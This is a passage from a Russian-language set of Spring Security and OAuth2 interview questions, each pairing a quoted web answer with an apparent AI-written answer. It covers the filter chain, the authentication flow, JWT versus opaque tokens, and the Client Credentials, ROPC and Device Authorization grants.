2. **SecurityContextPersistenceFilter** — устанавливает `SecurityContext` в `SecurityContextHolder` в начале запроса; по завершении копирует изменения обратно в `HttpSession`.
3. **ConcurrentSessionFilter** — обновляет `SessionRegistry` для отслеживания активных сессий.
4. **UsernamePasswordAuthenticationFilter / CasAuthenticationFilter / BasicAuthenticationFilter** — механизмы обработки аутентификации; обновляют `SecurityContextHolder` валидным `Authentication`-объектом.
5. **SecurityContextHolderAwareRequestFilter** — устанавливает обёртку `HttpServletRequest`, осведомлённую о Spring Security.
6. **JaasApiIntegrationFilter** — обрабатывает цепочку как `Subject` при наличии JAAS-токена.
7. **RememberMeAuthenticationFilter** — восстанавливает аутентификацию по remember-me cookie, если предыдущие механизмы не установили контекст.
8. **AnonymousAuthenticationFilter** — устанавливает анонимный `Authentication`, если контекст всё ещё не установлен.
9. **ExceptionTranslationFilter** — перехватывает исключения Spring Security; преобразует их в HTTP-ответ или запускает `AuthenticationEntryPoint`.
10. **FilterSecurityInterceptor** — защищает URI; при нарушении прав бросает исключения.

#### Ответ от Claude

**Архитектура цепочки фильтров**

Spring Security встраивается в цепочку сервлетов через `DelegatingFilterProxy`, который является обычным сервлет-фильтром и делегирует обработку бину `FilterChainProxy`. `FilterChainProxy` управляет одной или несколькими реализациями `SecurityFilterChain`, где каждая содержит упорядоченный список фильтров безопасности и сопоставляется с URL-паттерном через `RequestMatcher`.

```
HTTP Request
    |
DelegatingFilterProxy (регистрируется в Servlet Container)
    |
FilterChainProxy (Spring Bean)
    |
[SecurityFilterChain #1] → matcher: /api/**
[SecurityFilterChain #2] → matcher: /**  (обрабатывает первое совпадение)
```

**Полный канонический порядок фильтров (Spring Security 5.x)**

| Позиция | Фильтр | Роль |
|---|---|---|
| 1 | ChannelProcessingFilter | HTTP→HTTPS редирект |
| 2 | **SecurityContextPersistenceFilter** | Загрузка/сохранение SecurityContext |
| 3 | ConcurrentSessionFilter | Контроль параллельных сессий |
| 4 | **UsernamePasswordAuthenticationFilter** | Form-login аутентификация |
| 5 | BasicAuthenticationFilter | HTTP Basic аутентификация |
| 6 | RememberMeAuthenticationFilter | Remember-me аутентификация |
| 7 | AnonymousAuthenticationFilter | Установка анонимного контекста |
| 8 | **ExceptionTranslationFilter** | Преобразование исключений в HTTP |
| 9 | **FilterSecurityInterceptor** | Авторизация запросов |

**В Spring Security 6.x:**
- `SecurityContextPersistenceFilter` **устарел (deprecated)** и заменён на `SecurityContextHolderFilter`.
- `FilterSecurityInterceptor` заменён на `AuthorizationFilter`.
- Современный порядок начинается с `DisableEncodeUrlFilter`, `WebAsyncManagerIntegrationFilter`, `SecurityContextHolderFilter` и т.д.

**Ключевые фильтры — детально**

**SecurityContextPersistenceFilter (Spring 5) / SecurityContextHolderFilter (Spring 6):**
- Первый в цепочке security-фильтров (после ChannelProcessingFilter).
- Извлекает `SecurityContext` из `SecurityContextRepository` (по умолчанию `HttpSessionSecurityContextRepository`) и помещает в `SecurityContextHolder`.
- После выполнения цепочки: сохраняет изменённый контекст обратно в репозиторий и очищает `SecurityContextHolder` (в Spring 6 — только загружает; сохранение стало явным).
- Должен выполняться до ЛЮБОГО фильтра аутентификации.

**UsernamePasswordAuthenticationFilter:**
- Обрабатывает только POST `/login` (по умолчанию).
- Создаёт неавторизованный `UsernamePasswordAuthenticationToken` из параметров запроса.
- Делегирует `AuthenticationManager.authenticate()`.
- При успехе: вызывает `successfulAuthentication()` → сохраняет `Authentication` в `SecurityContextHolder` → вызывает `AuthenticationSuccessHandler`.
- При неудаче: вызывает `unsuccessfulAuthentication()` → очищает контекст → вызывает `AuthenticationFailureHandler`.

**ExceptionTranslationFilter:**
- Располагается перед `FilterSecurityInterceptor`.
- Оборачивает вызов цепочки в try-catch.
- Перехватывает `AuthenticationException` → вызывает `AuthenticationEntryPoint` (например, редирект на `/login`).
- Перехватывает `AccessDeniedException`:
  - если пользователь анонимный → вызывает `AuthenticationEntryPoint`;
  - если аутентифицирован → вызывает `AccessDeniedHandler` (возвращает 403).
- Важно: сохраняет оригинальный запрос в `RequestCache` для последующего редиректа после логина.

**FilterSecurityInterceptor (AuthorizationFilter в Spring 6):**
- Последний фильтр безопасности в цепочке.
- Получает `Authentication` из `SecurityContextHolder`.
- Через `SecurityMetadataSource` определяет требуемые права для данного URL.
- Делегирует `AccessDecisionManager` (или `AuthorizationManager` в Spring 6).
- Бросает `AccessDeniedException`, если доступ запрещён — эта исключение перехватывается `ExceptionTranslationFilter` выше по стеку.

**Что происходит при добавлении кастомного фильтра без явной позиции**

В Java-конфигурации `HttpSecurity` предоставляет три метода позиционирования:
- `addFilterBefore(filter, Class)` — перед указанным фильтром
- `addFilterAfter(filter, Class)` — после указанного фильтра
- `addFilterAt(filter, Class)` — на позицию указанного фильтра (не заменяет его, оба остаются)

Метод `addFilter(Filter)` предназначен **только для стандартных фильтров** Spring Security — фреймворк знает их позицию из перечня `FilterOrderRegistration`. Если передать туда кастомный фильтр, неизвестный этому перечню, Spring Security **выбросит исключение** `IllegalArgumentException: The Filter class ... does not have a registered order`.

Кроме того, если кастомный фильтр объявлен как Spring Bean (`@Component`), он автоматически регистрируется в Servlet Container и будет вызван дважды: один раз Servlet Container, один раз Spring Security. Решение — использовать `FilterRegistrationBean` с `setEnabled(false)`.

### Вопрос 36. Что происходит внутри Spring Security при вызове loadUserByUsername()? Опишите весь путь аутентификации: от HTTP-запроса до сохранения Principal в SecurityContextHolder.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Servlet Authentication Architecture — Spring Security Reference](https://docs.spring.io/spring-security/reference/servlet/authentication/architecture.html)

Официальная документация Spring Security описывает следующую архитектуру аутентификации для Servlet-приложений:

`SecurityContextHolder` — ключевое место, где хранится информация об аутентифицированном пользователе. `SecurityContext` содержит объект `Authentication`. `Authentication` служит двум целям: как входные данные для `AuthenticationManager` (с неаутентифицированными credentials) и как представление текущего пользователя (из `SecurityContextHolder`).

`AuthenticationManager` — API, определяющее способ аутентификации. `ProviderManager` — наиболее распространённая реализация, делегирующая список `AuthenticationProvider`. Каждый `AuthenticationProvider` может либо успешно аутентифицировать, либо отказаться, либо передать решение следующему. `DaoAuthenticationProvider` поддерживает username/password аутентификацию и использует `UserDetailsService` для загрузки деталей пользователя.

Принципал (`principal`) — это идентификатор пользователя; при username/password аутентификации это обычно объект `UserDetails`.

#### Ответ от Claude

**Полный путь аутентификации шаг за шагом**

**Шаг 1. HTTP-запрос поступает в фильтр-цепочку**

Браузер/клиент отправляет POST `/login` с параметрами `username` и `password`. `FilterChainProxy` передаёт запрос через цепочку фильтров. `SecurityContextHolderFilter` (Spring 6) загружает существующий `SecurityContext` из сессии (или создаёт пустой) и помещает в `SecurityContextHolder`.

**Шаг 2. AbstractAuthenticationProcessingFilter / UsernamePasswordAuthenticationFilter**

`UsernamePasswordAuthenticationFilter` (наследует `AbstractAuthenticationProcessingFilter`) проверяет, соответствует ли запрос его `RequestMatcher` (POST `/login`). Если да — извлекает `username` и `password` из параметров запроса и создаёт **неаутентифицированный** токен:

```java
UsernamePasswordAuthenticationToken authRequest =
    new UsernamePasswordAuthenticationToken(username, password);
// isAuthenticated() == false
// authorities == null
```

**Шаг 3. AuthenticationManager.authenticate()**

Созданный токен передаётся в `AuthenticationManager`. Стандартная реализация — `ProviderManager`, который содержит список `AuthenticationProvider`. `ProviderManager` итерирует по провайдерам, пока один из них не сможет обработать данный тип `Authentication`.

```
ProviderManager.authenticate(UsernamePasswordAuthenticationToken)
    → для каждого AuthenticationProvider:
        provider.supports(UsernamePasswordAuthenticationToken.class) ?
    → DaoAuthenticationProvider.supports(...) == true → делегируем
```

**Шаг 4. DaoAuthenticationProvider — вызов loadUserByUsername()**

`DaoAuthenticationProvider` реализует `AbstractUserDetailsAuthenticationProvider`. Процесс:

1. Извлекает `username` из токена.
2. Проверяет кэш (`UserCache`) — если там есть `UserDetails` для этого username, использует их.
3. Если в кэше нет → вызывает **`userDetailsService.loadUserByUsername(username)`**.
4. `UserDetailsService` (реализация разработчика) загружает пользователя из БД/LDAP/памяти и возвращает объект `UserDetails` (username, password-hash, authorities, флаги enabled/locked/expired).
5. Если пользователь не найден — `loadUserByUsername()` должен бросить `UsernameNotFoundException`.

```java
// Внутри DaoAuthenticationProvider:
UserDetails user = userDetailsService.loadUserByUsername(username);
// user содержит: хэш пароля, authorities, флаги аккаунта
```

**Шаг 5. Валидация credentials**

`DaoAuthenticationProvider` выполняет два вида проверок:

- **Pre-checks** (перед сравнением пароля): через `UserDetailsChecker.check()` — проверяет `isAccountNonLocked()`, `isEnabled()`, `isAccountNonExpired()`.
- **Проверка пароля:** `passwordEncoder.matches(rawPassword, user.getPassword())`. Если пароль не совпадает — бросается `BadCredentialsException`.
- **Post-checks:** `isCredentialsNonExpired()`.

**Шаг 6. Создание аутентифицированного Authentication**

При успешной валидации создаётся новый **аутентифицированный** токен:

```java
UsernamePasswordAuthenticationToken result =
    new UsernamePasswordAuthenticationToken(
        userDetails,           // principal — объект UserDetails
        null,                  // credentials очищены (безопасность)
        userDetails.getAuthorities() // список GrantedAuthority
    );
// isAuthenticated() == true
```

`ProviderManager` по умолчанию стирает credentials из результата (`eraseCredentialsAfterAuthentication = true`) через `CredentialsContainer.eraseCredentials()`.

**Шаг 7. Сохранение в SecurityContextHolder**

Успешный `Authentication` возвращается в `AbstractAuthenticationProcessingFilter.successfulAuthentication()`:

```java
// 1. Создаётся новый пустой SecurityContext (не переиспользуется существующий — защита от session fixation)
SecurityContext context = SecurityContextHolder.createEmptyContext();

// 2. Authenticated токен помещается в контекст
context.setAuthentication(authResult);

// 3. Контекст сохраняется в SecurityContextHolder (ThreadLocal)
SecurityContextHolder.setContext(context);

// 4. SecurityContextRepository сохраняет контекст в HttpSession
securityContextRepository.saveContext(context, request, response);
```

**Шаг 8. Вызов обработчиков и редирект**

- Вызывается `RememberMeServices.loginSuccess()` (если включён remember-me).
- Публикуется `InteractiveAuthenticationSuccessEvent`.
- Вызывается `AuthenticationSuccessHandler.onAuthenticationSuccess()` — по умолчанию редирект на сохранённый в `RequestCache` URL или на `/`.

**Схема полного пути**

```
HTTP POST /login (username, password)
    |
SecurityContextHolderFilter  ← загружает SecurityContext из сессии
    |
UsernamePasswordAuthenticationFilter
    |── извлекает username + password
    |── создаёт UsernamePasswordAuthenticationToken (не аутентифицирован)
    |
AuthenticationManager (ProviderManager)
    |── итерирует AuthenticationProvider[]
    |
DaoAuthenticationProvider
    |── UserCache.getUserFromCache(username) → miss
    |── UserDetailsService.loadUserByUsername(username)
    |       └── SELECT * FROM users WHERE username=? → UserDetails
    |── PreAuthenticationChecks (enabled, nonLocked, nonExpired)
    |── PasswordEncoder.matches(raw, hash)
    |── PostAuthenticationChecks (credentialsNonExpired)
    |── создаёт аутентифицированный UsernamePasswordAuthenticationToken
    |       principal = UserDetails, credentials = null, authorities = [...]
    |
AbstractAuthenticationProcessingFilter.successfulAuthentication()
    |── SecurityContextHolder.setContext(новый контекст с Authentication)
    |── SecurityContextRepository.saveContext() → HttpSession
    |── RememberMeServices.loginSuccess()
    |── ApplicationEventPublisher.publishEvent(InteractiveAuthenticationSuccessEvent)
    |── AuthenticationSuccessHandler.onAuthenticationSuccess() → redirect
    |
Последующие запросы:
SecurityContextHolderFilter загружает Authentication из HttpSession
    → Principal доступен через SecurityContextHolder.getContext().getAuthentication()
```

**Доступ к Principal в коде**

```java
// Вариант 1: через SecurityContextHolder
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
UserDetails principal = (UserDetails) auth.getPrincipal();

// Вариант 2: через аргумент метода контроллера
@GetMapping("/profile")
public String profile(@AuthenticationPrincipal UserDetails user) {
    return user.getUsername();
}
```

**Важные нюансы**

- `SecurityContextHolder` использует `ThreadLocal` по умолчанию — контекст привязан к потоку. В реактивных приложениях (WebFlux) используется `ReactiveSecurityContextHolder` на основе Reactor Context.
- Создание нового `SecurityContext` (а не изменение существующего) на шаге 7 — защита от атаки Session Fixation.
- После завершения запроса `SecurityContextHolderFilter` очищает `SecurityContextHolder`, предотвращая утечку контекста между запросами в thread pool.
### Вопрос 37. Чем отличается непрозрачный (opaque) токен от JWT в роли OAuth2 Access Token? Как Spring Security Resource Server валидирует каждый из них и в каком сценарии introspection-endpoint предпочтительнее локальной проверки подписи?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [OAuth 2.0 Resource Server Opaque Token :: Spring Security](https://docs.spring.io/spring-security/reference/servlet/oauth2/resource-server/opaque-token.html)

**Опаковый токен** — строка без читаемого содержимого: просто идентификатор, смысл которого известен только авторизационному серверу. При каждом входящем запросе Resource Server должен запрашивать introspection-endpoint авторизационного сервера (RFC 7662), передавая токен и собственные учётные данные. Сервер отвечает JSON-объектом; если в нём `"active": true`, токен считается действительным, а из ответа извлекаются scope и иные атрибуты.

**JWT (JSON Web Token)** — самодостаточный токен: header.payload.signature в кодировке Base64URL. Resource Server проверяет подпись локально с помощью публичного ключа, полученного с JWKS-endpoint авторизационного сервера при запуске (или периодически обновляемого). Дополнительно проверяются стандартные claims: `iss`, `exp`, `nbf`, `aud`.

Минимальная конфигурация для opaque-токена:
```yaml
spring:
  security:
    oauth2:
      resourceserver:
        opaquetoken:
          introspection-uri: https://idp.example.com/introspect
          client-id: client
          client-secret: secret
```

Обработка запроса при opaque-токене:
```
Request -> BearerTokenAuthenticationFilter -> OpaqueTokenAuthenticationProvider
                                                        |
                                              OpaqueTokenIntrospector
                                                        |
                                              Introspection Endpoint
                                                        |
                                           OAuth2AuthenticatedPrincipal
```

Обработка запроса при JWT:
```
Request -> BearerTokenAuthenticationFilter -> JwtAuthenticationProvider
                                                        |
                                                   JwtDecoder
                                          (локальная верификация подписи)
                                                        |
                                            JwtAuthenticationToken
```

Сравнение подходов:

| Аспект | Opaque (introspection) | JWT (локальная проверка) |
|---|---|---|
| Сетевой вызов на каждый запрос | Да | Нет |
| Немедленный отзыв токена | Да | Нет (только по истечении `exp`) |
| Зависимость от доступности AS | Постоянная | Только при инициализации и ротации ключей |
| Производительность | Ниже (latency) | Выше |
| Формат токена | Произвольная строка | header.payload.signature |

**Когда introspection предпочтительнее локальной проверки:** когда отзыв токена должен вступать в силу немедленно — например, при выходе пользователя из системы, блокировке аккаунта или компрометации токена. В регулируемых средах (финтех, медицина) требование немедленной инвалидации обычно прямо прописано в политиках безопасности. Также introspection обязательна, если токен не является JWT и не несёт читаемых claims.

#### Ответ от Claude

**Opaque-токен** — непрозрачный идентификатор без читаемого содержимого (RFC 7662). Сам по себе он ничего не говорит о пользователе или правах доступа. Resource Server не может проверить его самостоятельно и вынужден при каждом запросе обращаться к introspection-endpoint авторизационного сервера (AS).

**JWT (RFC 7519 / RFC 9068)** — самодостаточный токен в формате `header.payload.signature`. Содержит claims (sub, iss, exp, aud, scope и др.) прямо внутри, что позволяет Resource Server проверять его локально без обращения к AS.

**Как Spring Security Resource Server валидирует каждый тип**

*Opaque-токен:*
- Spring Boot конфигурируется через `spring.security.oauth2.resourceserver.opaquetoken.introspection-uri`.
- При каждом запросе `OpaqueTokenAuthenticationProvider` вызывает `OpaqueTokenIntrospector`, который делает HTTP POST на introspection-endpoint с параметром `token` и Basic-аутентификацией клиента.
- AS возвращает JSON с полем `active`. Если `active: true`, из ответа извлекаются scope и другие атрибуты; создаётся `BearerTokenAuthentication`.
- Если AS недоступен — запрос отклоняется.

*JWT:*
- Spring Boot конфигурируется через `spring.security.oauth2.resourceserver.jwt.issuer-uri` (или `jwk-set-uri`).
- При запуске `NimbusJwtDecoder` запрашивает JWKS-endpoint и кеширует публичные ключи (по умолчанию на 5 минут).
- При каждом запросе `JwtAuthenticationProvider` передаёт токен в `JwtDecoder`, который локально верифицирует подпись и проверяет claims: `iss`, `exp`, `nbf`, `aud`.
- Сетевой вызов к AS не нужен (за исключением ротации ключей).
- Создаётся `JwtAuthenticationToken`.

**Когда introspection предпочтительнее локальной проверки подписи**

1. **Требуется немедленный отзыв токена.** JWT после выдачи действует до истечения `exp`; отозвать его без introspection невозможно без дополнительной инфраструктуры (черный список токенов). Introspection проверяет актуальный статус на стороне AS при каждом запросе.
2. **Блокировка пользователя должна вступать в силу мгновенно** — при удалении аккаунта, смене пароля, принудительном разлогине.
3. **Compliance-требования** в регулируемых отраслях (банки, медицина, госсекторе) обязывают проверять статус сессии при каждом обращении.
4. **Токен не является JWT** — когда AS выдаёт случайный идентификатор (например, UUID), introspection — единственный способ валидации.
5. **Необходим доступ к актуальным метаданным токена** — если AS обновляет scope или права пользователя после выдачи токена, introspection вернёт актуальные данные, а JWT будет содержать устаревшие.

**Компромисс**: introspection создаёт дополнительный network round-trip на каждый запрос, что увеличивает latency и создаёт зависимость от доступности AS. Для высоконагруженных API без строгих требований к немедленному отзыву JWT с коротким TTL (5–15 минут) является предпочтительным выбором.

Spring Security также поддерживает гибридный подход: JWT-токены, валидируемые через introspection (проверка `active` + локальный разбор claims). Это позволяет сочетать читаемость JWT с контролем отзыва через AS.

### Вопрос 38. Что такое OAuth2 Client Credentials Grant и чем он принципиально отличается от Authorization Code Flow? В каких сценариях он применяется и почему для него не нужен пользовательский consent?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [OAuth 2.0 Client Credentials Grant Type](https://oauth.net/2/grant-types/client-credentials/)

Client Credentials grant type используется клиентами для получения access token вне контекста пользователя. Это типичный способ взаимодействия сервисов между собой, когда приложение обращается к ресурсам от своего имени, а не от имени конкретного пользователя. Client Credentials grant используется в машинных (machine-to-machine, M2M) коммуникациях, когда никакой конечный пользователь не взаимодействует с приложением.

Отличие от Authorization Code Flow: Authorization Code требует участия пользователя — он логинится и даёт согласие на доступ к своим ресурсам. Client Credentials полностью исключает пользователя из процесса: клиентское приложение напрямую аутентифицируется на авторизационном сервере, используя свои учётные данные (client_id и client_secret), и получает access token.

#### Ответ от Claude

**Client Credentials Grant** (RFC 6749, раздел 4.4) — тип разрешения, при котором клиентское приложение получает access token, предъявив только свои собственные учётные данные (client_id + client_secret или другой механизм аутентификации клиента). Пользователь в этом процессе не участвует.

**Поток Client Credentials Grant:**
```
Клиент (сервис A)                 Авторизационный сервер
        |                                    |
        |-- POST /token                      |
        |   grant_type=client_credentials    |
        |   client_id=...                    |
        |   client_secret=...                |
        |   scope=...               -------> |
        |                                    |
        |<-- { access_token, expires_in } ---|
        |                                    |
        |-- API-запрос с Bearer token -----> Ресурсный сервер
```

**Принципиальные отличия от Authorization Code Flow:**

| Аспект | Client Credentials | Authorization Code Flow |
|---|---|---|
| Участие пользователя | Отсутствует | Обязательно (логин + consent) |
| Redirect URI | Не нужен | Обязателен |
| От чьего имени действует | От имени самого клиента | От имени пользователя (делегирование) |
| Refresh token | Обычно не выдаётся | Выдаётся |
| Применение | M2M, сервис-сервис | Веб-приложения, мобильные клиенты |
| User context в токене | Отсутствует | Присутствует (sub = user id) |

**Почему не нужен пользовательский consent:**
В Authorization Code Flow пользователь даёт согласие на доступ к своим ресурсам от своего имени. В Client Credentials Flow не существует понятия «ресурсы пользователя» — клиент запрашивает доступ к ресурсам, принадлежащим самому клиенту или предназначенным для сервисного взаимодействия. Нет «владельца ресурса» (resource owner) в человеческом смысле, поэтому процедура consent не применима.

**Сценарии применения Client Credentials:**

1. **Межсервисное взаимодействие в микросервисной архитектуре** — сервис заказов вызывает сервис инвентаризации без участия пользователя.
2. **Фоновые задачи и планировщики** — cron-jobs, batch-обработка данных, ночные отчёты.
3. **CI/CD пайплайны** — автоматизированные системы деплоя, которым нужен доступ к API.
4. **IoT-устройства** — устройство аутентифицирует себя, а не пользователя.
5. **Интеграции с внешними сервисами** — приложение вызывает сторонний API для агрегации данных.
6. **Административные операции** — фоновая синхронизация, очистка кеша, административные задачи.

**Конфигурация в Spring Security:**
```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          my-service:
            client-id: my-client-id
            client-secret: my-client-secret
            authorization-grant-type: client_credentials
            scope: read, write
        provider:
          my-service:
            token-uri: https://auth.example.com/oauth2/token
```

**Важно:** Client Credentials Grant не предполагает делегирования прав пользователя. Если требуется действовать от имени конкретного пользователя (например, читать его личные данные), необходимо использовать Authorization Code Flow. Client Credentials подходит только для сервисных операций, не привязанных к конкретному пользователю.

### Вопрос 39. Почему OAuth2 Resource Owner Password Credentials (ROPC) Grant устарел и удалён из OAuth 2.1? Какие конкретные угрозы безопасности он несёт и какой flow рекомендуется вместо него для legacy-клиентов?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [OAuth 2.0 Password Grant Type](https://oauth.net/2/grant-types/password/)

Resource Owner Password Credentials (ROPC) grant — устаревший способ обмена учётных данных пользователя на access token. Клиентское приложение собирает имя пользователя и пароль, затем отправляет их напрямую на авторизационный сервер. Поскольку клиентское приложение собирает пароль пользователя, этот способ не рекомендуется к использованию. Последние OAuth 2.0 Security Best Current Practice (RFC 9700) полностью запрещают этот grant. ROPC не предусматривает механизмов для таких вещей, как многофакторная аутентификация или делегирование. ROPC отсутствует в спецификации OAuth 2.1.

#### Ответ от Claude

**Resource Owner Password Credentials (ROPC) Grant** (RFC 6749, раздел 4.3) — тип разрешения, при котором клиентское приложение напрямую собирает логин и пароль пользователя и передаёт их авторизационному серверу для получения access token.

**Поток ROPC:**
```
Пользователь          Клиент (приложение)     Авторизационный сервер
     |                        |                         |
     |-- логин + пароль -----> |                         |
     |                        |-- POST /token            |
     |                        |   grant_type=password    |
     |                        |   username=user          |
     |                        |   password=secret   ---> |
     |                        |                         |
     |                        |<-- { access_token } ---- |
```

**Почему ROPC удалён из OAuth 2.1 (и запрещён в RFC 9700):**

ROPC нарушает фундаментальный принцип OAuth: пользователь не должен раскрывать свои учётные данные третьим приложениям. Вместо этого аутентификацию должен выполнять исключительно авторизационный сервер.

**Конкретные угрозы безопасности:**

1. **Прямое раскрытие пароля клиентскому приложению.** Пароль пользователя оказывается в памяти и коде клиентского приложения, которое может его сохранить, залогировать или передать третьим сторонам. OWASP прямо формулирует: «данный grant небезопасно раскрывает учётные данные resource owner клиенту, увеличивая поверхность атаки».

2. **Отсутствие защиты от фишинга.** Пользователь не может отличить легитимное приложение от фишингового: оба показывают форму ввода логина и пароля. При Authorization Code Flow пользователь вводит пароль только на странице авторизационного сервера с известным URL.

3. **Невозможность многофакторной аутентификации (MFA).** ROPC предполагает только логин + пароль. Добавить TOTP, SMS-код, аппаратный ключ или push-уведомление в этот flow невозможно без нестандартных расширений.

4. **Невозможность делегирования и выбора аккаунта.** Пользователь не может выбрать, от имени какого аккаунта действовать, или ограничить scope без вмешательства разработчика приложения.

5. **Расширение доверенной поверхности.** Каждое приложение, использующее ROPC, фактически становится «промежуточным» хранилищем учётных данных, что нарушает принцип минимальных привилегий.

6. **Нарушение аудит-трейла.** Авторизационный сервер не знает, как именно клиент получил учётные данные, что затрудняет аудит и расследование инцидентов.

**Что рекомендуется вместо ROPC:**

**Для всех современных клиентов** — Authorization Code Flow с PKCE (RFC 7636). OAuth 2.1 требует PKCE для всех клиентов, использующих Authorization Code Flow.

Преимущества Authorization Code + PKCE:
- Пользователь вводит пароль только на странице AS (не в приложении).
- Поддержка MFA, SSO, социального входа.
- Защита от code injection attacks через PKCE.
- Работает для веб-приложений, SPA, нативных и мобильных приложений.

**Для legacy-клиентов, которые не могут открыть браузер** (CLI-утилиты, headless-приложения) — рекомендуется **Device Authorization Grant** (RFC 8628): пользователь авторизует устройство через браузер на другом устройстве.

**Миграционный путь для legacy-систем:**
1. Если приложение — first-party (разработано той же организацией, что и AS) и переход на Code Flow невозможен краткосрочно — ROPC допустим как временная мера с жёсткими компенсирующими контролями (шифрование канала, аудит, ограниченный срок жизни токенов).
2. Долгосрочная цель — всегда переход на Authorization Code Flow + PKCE или Device Flow.

**Расхождение между источниками:** oauth.net/2/grant-types/password/ описывает ROPC как «legacy», не рекомендованный, но не запрещённый в рамках RFC 6749. RFC 9700 (Best Current Practice) и OAuth 2.1 (draft) его полностью запрещают. OWASP Cheat Sheet прямо пишет: «не использовать вообще». Практическая рекомендация — следовать наиболее строгой позиции и избегать ROPC в новых системах.

### Вопрос 40. Как работает OAuth2 Device Authorization Grant (RFC 8628)? Опишите пошаговый flow, назовите участников и объясните, в каком сценарии этот grant type является единственно возможным вариантом.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [RFC 8628 — OAuth 2.0 Device Authorization Grant (IETF)](https://www.rfc-editor.org/rfc/rfc8628.html)

Спецификация RFC 8628 описывает расширение OAuth 2.0 для устройств, у которых отсутствует браузер или которые имеют ограниченные возможности ввода текста — например, Smart TV, медиаприставки, принтеры, IoT-устройства.

**Участники:**
1. **Device Client (Устройство-клиент)** — OAuth-клиент на устройстве с ограниченным вводом.
2. **Authorization Server (Сервер авторизации)** — выдаёт коды верификации и токены.
3. **End User (Конечный пользователь)** — авторизует запрос через вторичное устройство с браузером (смартфон, ПК).

**Пошаговый flow (Section 1, Figure 1):**

**Шаг A — Запрос авторизации устройства (Section 3.1):**
Устройство отправляет HTTP POST на device authorization endpoint. Обязательный параметр: `client_id`; опциональный: `scope`.
```
POST /device_authorization
client_id=1406020730&scope=example_scope
```

**Шаг B — Ответ с кодами (Section 3.2):**
Сервер авторизации отвечает JSON-объектом:
- `device_code` — уникальный код сессии устройства;
- `user_code` — короткий код для ввода пользователем;
- `verification_uri` — URL, на который пользователь должен зайти;
- `verification_uri_complete` (опционально) — URI со встроенным `user_code` (удобен для QR-кода);
- `expires_in` — срок жизни кодов в секундах;
- `interval` (опционально, по умолчанию 5 с) — минимальный интервал между polling-запросами.

**Шаг C — Отображение инструкций пользователю (Section 3.3):**
Устройство показывает `verification_uri` и `user_code` на экране (или QR-код).

**Шаг D — Авторизация пользователем (Section 3.3):**
Пользователь открывает `verification_uri` в браузере на вторичном устройстве, проходит аутентификацию и вводит `user_code`, подтверждая или отклоняя запрос.

**Шаг E — Polling токен-эндпоинта (Section 3.4):**
Пока пользователь завершает шаг D, устройство циклически опрашивает token endpoint:
```
POST /token
grant_type=urn:ietf:params:oauth:grant-type:device_code
&device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS
&client_id=1406020730
```
Возможные промежуточные ответы: `authorization_pending`, `slow_down` (увеличить интервал на 5 с).

**Шаг F — Получение токена (Section 3.5):**
После успешной авторизации сервер возвращает `access_token` (и опционально `refresh_token`). При отказе пользователя — `access_denied`; при истечении кодов — `expired_token`.

**Единственно возможный сценарий:**
RFC 8628 прямо указывает (Section 1): этот grant type предназначен для устройств, которые «либо не имеют браузера для user-agent-based авторизации, либо ограничены в вводе настолько, что требовать от пользователя ввода текста в процессе авторизации нецелесообразно». При этом устройство обязано иметь исходящее HTTPS-соединение и возможность отобразить URI и код. Спецификация явно оговаривает, что данный flow **не предназначен** для замены browser-based OAuth в нативных приложениях на смартфонах (там применяется RFC 8252).

#### Ответ от Claude

**Участники (4 роли по RFC 8628 и практике):**
- **Device** — устройство с ограниченным UI (Smart TV, игровая консоль, IoT-термостат, принтер, CLI-инструмент без браузера).
- **Authorization Server** — выдаёт коды верификации, принимает consent пользователя и выдаёт токены.
- **End User** — человек, авторизующий запрос.
- **Secondary Device** — смартфон или ПК пользователя с полноценным браузером (явно выделяется в практических описаниях, хотя RFC объединяет пользователя и устройство в одну роль).

**Пошаговый flow:**

1. **Устройство → Authorization Server:** POST на device authorization endpoint с `client_id` и `scope`.
2. **Authorization Server → Устройство:** `device_code`, `user_code`, `verification_uri`, `expires_in`, `interval`.
3. **Устройство → Пользователь:** отображает `user_code` и `verification_uri` (или QR-код с `verification_uri_complete`).
4. **Пользователь → Authorization Server (через вторичное устройство):** открывает `verification_uri`, аутентифицируется, вводит `user_code`, подтверждает согласие.
5. **Устройство → Authorization Server (polling):** периодически (не чаще `interval` секунд) POST на token endpoint с `grant_type=urn:ietf:params:oauth:grant-type:device_code` и `device_code`. Ответы: `authorization_pending` — ждать; `slow_down` — увеличить интервал на 5 с; `access_denied` — пользователь отказал; `expired_token` — коды просрочены.
6. **Authorization Server → Устройство:** после успешного consent — `access_token` (и при необходимости `refresh_token`).

**Когда Device Authorization Grant является единственным вариантом:**

Этот grant type незаменим, когда выполняются оба условия одновременно:
1. Устройство **не имеет браузера** (или браузер функционально непригоден для OAuth redirect-flow).
2. **Ввод текста** на устройстве настолько неудобен, что традиционный credentials-based flow неприемлем.

Примеры сценариев: Smart TV без клавиатуры (пульт ДУ не пригоден для ввода пароля), IoT-устройства (камеры, термостаты) без UI-интерфейса, промышленные принтеры, CLI-утилиты в headless-окружениях (например, `gcloud auth login --no-launch-browser` от Google). В таких случаях ни Authorization Code Grant (требует редиректа браузера), ни Implicit, ни Client Credentials (нет привязки к пользователю), ни Resource Owner Password Credentials (передаёт пароль клиенту, что нарушает принципы безопасности и к тому же устарел в OAuth 2.1) не могут обеспечить делегирование доступа от имени пользователя без ухудшения безопасности.

**Важный нюанс:** RFC 8628 не запрещает использование Device Flow на устройствах с браузером, но указывает, что для таких устройств (смартфоны, десктопы) предпочтительнее RFC 8252 (OAuth 2.0 for Native Apps) с PKCE.
